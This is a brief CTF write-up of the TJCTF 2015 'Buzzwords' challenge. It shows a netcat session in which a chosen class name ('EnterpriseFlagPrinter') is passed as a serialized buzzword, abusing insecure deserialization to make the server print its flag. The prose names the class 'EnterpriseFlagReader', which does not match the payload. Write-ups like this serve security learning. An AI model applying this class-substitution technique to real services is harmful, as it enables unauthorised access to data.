---
layout: post
title: "TJCTF 2015 Buzzwords"
date: 2015-04-29 02:19:56 -0400
author: [superkojiman]
comments: true
categories: [tjctf]
---

### Solved by superkojiman

Connecting to the target presents a menu:

```
koji@pwnbox32:~/Desktop/buzzword$ nc p.tjctf.org 8089
Welcome to the Enterprise Buzzword Factory
Here are your options: 
1. Show all buzzwords
2. Create a buzzword
3. Add a buzzword
```

We can add buzzwords using EnterpriseBuzzword:whatever. However if we look at the provided Java source files, we see that EnterpriseFlagReader has the same deserialize() method that EnterpriseBuzzword has, except that it returns the flag. So instead, we'll use EnterpriseFlagPrinter when adding buzzword:

```
koji@pwnbox32:~/Desktop/buzzword$ nc p.tjctf.org 8089
Welcome to the Enterprise Buzzword Factory
Here are your options: 
1. Show all buzzwords
2. Create a buzzword
3. Add a buzzword
3
Your serialized buzzword: EnterpriseFlagPrinter:w00t
your flag is ayy lmao
```

Flag is: ayy lmao

